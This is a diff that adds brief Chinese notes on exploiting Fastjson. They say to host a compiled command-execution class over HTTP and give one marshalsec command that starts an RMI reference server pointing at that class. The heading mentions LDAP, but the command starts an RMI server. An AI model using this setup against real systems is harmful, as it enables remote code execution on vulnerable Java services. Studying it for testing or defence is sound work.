@@ -1,0 +1,9 @@
+FASTJSON 漏洞利用方式
+
+编译命令执行文件，并放至于http环境下
+
+
+LDAP服务启动（利用marshalsec）
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:port/#类名，不带class 8888
+
+
